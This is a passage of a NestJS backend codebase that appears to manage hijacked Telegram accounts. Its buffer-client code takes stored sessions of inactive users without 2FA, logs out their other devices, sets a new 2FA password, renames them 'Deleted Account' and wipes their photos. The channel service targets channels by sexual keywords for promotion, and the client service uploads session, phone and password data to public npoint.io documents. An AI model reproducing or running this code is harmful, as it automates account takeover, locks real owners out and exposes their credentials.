{\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New buffer documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        await sleep(2000);\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const bufferClient = {\n                            tgId: document.tgId,\n                            session: document.session,\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(bufferClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created BufferClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as BufferClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForBufferClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchBufferClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the bufferClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsOptional()\n  @IsString()\n  readonly session?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\n\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { BuildService } from './build.service';\n\n@ApiTags('Build')\n@Controller('builds')\nexport class BuildController {\n  constructor(private readonly buildService: BuildService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get build data' })\n  async findOne(): Promise<any>{\n    return this.buildService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update build' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.buildService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BuildService } from './build.service';\nimport { BuildController } from './build.controller';\nimport { BuildSchema } from './builds.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    BuildModule,\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\n    NpointModule,\n  ],\n  providers: [BuildService],\n  controllers: [BuildController],\n  exports: [BuildModule],\n})\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","// src/channels/channels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ChannelsService } from './channels.service';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { SearchChannelDto } from './dto/search-channel.dto';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel } from './schemas/channel.schema';\n\n@ApiTags('Channels')\n@Controller('channels')\nexport class ChannelsController {\n  constructor(private readonly channelsService: ChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new  channel' })\n  async create(@Body() createChannelDto: CreateChannelDto) {\n    return this.channelsService.create(createChannelDto);\n  }\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\n    return this.channelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\n    console.log(query);\n    return this.channelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all  channels' })\n  async findAll() {\n    return this.channelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.channelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\n    return this.channelsService.update(channelId, updateChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.channelsService.remove(channelId);\n  }\n}\n","// src/channels/channels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ChannelsService } from './channels.service';\nimport { ChannelsController } from './channels.controller';\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\n  ],\n  controllers: [ChannelsController],\n  providers: [ChannelsService],\n  exports: [ChannelsService]\n})\nexport class ChannelsModule { }\n","// src/channels/channels.service.ts\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) { console.log(Channel.name) }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    let query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\n    try {\n      const result: Channel[] = await this.ChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateChannelDto {\n  @ApiProperty({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is a broadcast channel',\n    example: null,\n    required: false,\n  })\n  broadcast?: boolean;\n\n  @ApiProperty({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel is a megagroup',\n    example: null,\n    required: false,\n  })\n  megagroup?: boolean;\n\n  @ApiProperty({\n    description: 'Number of participants in the channel',\n    example: 0,\n  })\n  participantsCount: number;\n\n  @ApiProperty({\n    description: 'Whether the channel is restricted',\n    example: null,\n    required: false,\n  })\n  restricted?: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel can send messages',\n    example: null,\n    required: false,\n  })\n  sendMessages?: boolean;\n\n  @ApiProperty({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title: string;\n\n  @ApiProperty({\n    description: 'Username of the channel',\n    example: null,\n    required: false,\n  })\n  username?: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n\n  @ApiProperty({\n    default: false, example: false,\n    required: false,\n  })\n  forbidden: boolean = false;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class SearchChannelDto {\n  @ApiPropertyOptional({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title?: string;\n\n  @ApiPropertyOptional({\n    description: 'privacy of the channel',\n    example: false,\n  })\n  private?: string;\n\n  @ApiPropertyOptional({\n    description: 'Username of the channel',\n    example: 'ayesha_channel',\n  })\n  username?: string;\n\n  @ApiPropertyOptional({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs?: boolean;\n\n  @ApiPropertyOptional({\n    description: 'Minimum number of participants in the channel',\n    example: 10,\n  })\n  minParticipantsCount?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum number of participants in the channel',\n    example: 100,\n  })\n  maxParticipantsCount?: number;\n}\n","// src/channels/dto/update-channel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateChannelDto } from './create-channel.dto';\n\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse } from '@nestjs/swagger';\nimport { ClientService } from './client.service';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { Client } from './schemas/client.schema';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { UpdateClientDto } from './dto/update-client.dto';\n\n@ApiTags('Clients')\n@Controller('clients')\nexport class ClientController {\n  constructor(private readonly clientService: ClientService) {}\n\n  /**\n   * Create a new client\n   */\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\n    try {\n      return await this.clientService.create(createClientDto);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n    }\n  }\n\n  /**\n   * Search for clients based on query parameters\n   */\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\n    try {\n      return await this.clientService.search(query);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n    }\n  }\n\n  @Get('updateClient/:clientId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async updateClient(@Param('clientId') clientId: string) {\n    return this.clientService.updateClient(clientId);\n  }\n  \n  /**\n   * Get all clients with masked sensitive fields\n   */\n  @Get('maskedCls')\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\n  async findAllMasked(@Query() query: SearchClientDto) {\n    try {\n      return await this.clientService.findAllMasked(query);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n    }\n  }\n\n  /**\n   * Get all clients\n   */\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\n  async findAll(): Promise<Client[]> {\n    try {\n      return await this.clientService.findAll();\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n    }\n  }\n\n  /**\n   * Get a specific client by ID\n   */\n  @Get(':clientId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\n  @ApiResponse({ status: 404, description: 'User data not found.' })\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\n    try {\n      return await this.clientService.findOne(clientId);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n    }\n  }\n\n  /**\n   * Update a specific client by ID\n   */\n  @Patch(':clientId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\n  @ApiResponse({ status: 404, description: 'User data not found.' })\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\n    try {\n      return await this.clientService.update(clientId, updateClientDto);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n    }\n  }\n\n  /**\n   * Delete a specific client by ID\n   */\n  @Delete(':clientId')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\n  @ApiResponse({ status: 404, description: 'User data not found.' })\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\n    try {\n      return await this.clientService.remove(clientId);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n    }\n  }\n\n  /**\n   * Execute a custom MongoDB query\n   */\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.clientService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n    }\n  }\n\n  /**\n   * Add a mobile number to the promoteMobile array for a specific client\n   */\n  @Patch(':clientId/promoteMobile/add')\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\n  @ApiResponse({ status: 404, description: 'Client not found.' })\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\n    try {\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n    }\n  }\n\n  /**\n   * Remove a mobile number from the promoteMobile array for a specific client\n   */\n  @Patch(':clientId/promoteMobile/remove')\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\n  @ApiResponse({ status: 404, description: 'Client not found.' })\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\n    try {\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\n    } catch (error) {\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n    }\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    forwardRef(()=>TelegramModule),\n    forwardRef(()=>BufferClientModule),\n    forwardRef(()=>UsersModule),\n    forwardRef(()=>ArchivedClientModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService]\n})\nexport class ClientModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\nimport { areJsonsNotSame, contains, fetchNumbersFromString, fetchWithTimeout, mapToJson, parseError, ppplbot, toBoolean } from '../../utils';\nimport { UpdateClientDto } from './dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport * as path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { NpointService } from '../n-point/npoint.service';\nimport axios from 'axios';\nlet settingupClient = Date.now() - 250000;\n@Injectable()\nexport class ClientService {\n    private clientsMap: Map<string, Client> = new Map();\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ArchivedClientService))\n        private archivedClientService: ArchivedClientService,\n        private npointSerive: NpointService\n    ) {\n        setInterval(async () => {\n            await this.refreshMap();\n        }, 5 * 60 * 1000);\n    }\n\n    async checkNpoint() {\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\n        for (const client in clients) {\n            const existingClient = await this.findOne(client, false);\n            if (areJsonsNotSame(existingClient, clients[client])) {\n                await this.findAll();\n                const clientData = mapToJson(this.clientsMap)\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\n                const maskedCls = {};\n                for (const client in clientData) {\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\n                    maskedCls[client] = maskedClient\n                }\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\n                break;\n            }\n        }\n    }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.clientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const clientMapLength = this.clientsMap.size\n        if (clientMapLength < 20) {\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\n            for (const client of results) {\n                this.clientsMap.set(client.clientId, client)\n            }\n            console.log(\"Refreshed Clients\")\n            return results\n        } else {\n            return Array.from(this.clientsMap.values())\n        }\n    }\n\n    async findAllMasked(query?: SearchClientDto) {\n        const allClients = await this.findAll()\n        const filteredClients = query\n            ? allClients.filter(client => {\n                return 